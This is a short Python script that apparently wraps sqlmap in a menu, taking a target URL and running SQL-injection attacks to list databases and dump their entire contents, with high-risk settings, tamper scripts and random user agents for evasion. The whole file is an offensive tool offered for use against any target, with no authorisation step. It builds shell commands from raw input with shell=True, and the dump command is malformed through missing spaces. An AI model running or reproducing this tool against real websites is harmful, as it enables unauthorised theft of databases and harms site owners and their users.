import os
import subprocess

target_url = input('Set your target to start : ')

def hphong_dpchai():
    print("""
            ▄█▀▀▀█▄█ ▄▄█▀▀██▄  ▀███▀▀▀██▄  ▄██    ▀███▀    ▀██▄
          ██   ▀██▄ ▀███▄   ██▀      ▀██  ██   ▄██    ▀█████▄█
          ██   ███████   ▄     ▀███▄      ▄██  ██        ██
          ██     ████▄    ▄██▀  ██        █▀█████▀  ▀▀████▀▀
          ▄████▄                    ███                              ▀████▀
             All choice here :
            1 : expoit target using sqlmap(this will take a lot of time)
            2 : install sqlmap
            3 : clear the screen
            4 : author information
            5 : dump database (this will take a lot of time )
        """)

    command = input('hphong@SQP~: ')

    if command == '1':
        exploit(target_url)
    elif command == '2':
        hphong_install()
    elif command == '3':
        os.system('clear')
    elif command == '4':
        authordpchai()
    elif command == '5':
       hphong_dump()

def hphong_install():
    print('DOWNLOADING SSQLMAP PLS WAIT A MIN')
    os.system('pip install sqlmap')
    
def hphong_dump():
    target_url = input('TARGET : ')
    database = input('DBNAME : ')
    cmd = 'sqlmap -u' + target_url + ' --threads=10 --risk=3 --level=3 --tamper=space2plus -D' + database + ' --dump-all' + ' --batch'
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=None, shell=True)
    result = process.communicate()[0]
    print("dumped dbs : ", result.decode())

def authordpchai():
    print("""
        Admin : hphongdev
        Telegram : @vilgaxinjector
        twitter : @vilgaxinjector

        ______________
        if you found any problem pls contact me
        dont encode my program if you dont want to be a skid
        """)

def exploit(target_url):
    target_url = input('TARGET : ')
    cmd = 'sqlmap -u ' + target_url + ' --dbs --threads=10 --hex --risk=3 --batch --random-agent'
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=None, shell=True)
    result = process.communicate()[0]
    print("Here is your result: ", result.decode())

if __name__ == '__main__':
    hphong_dpchai()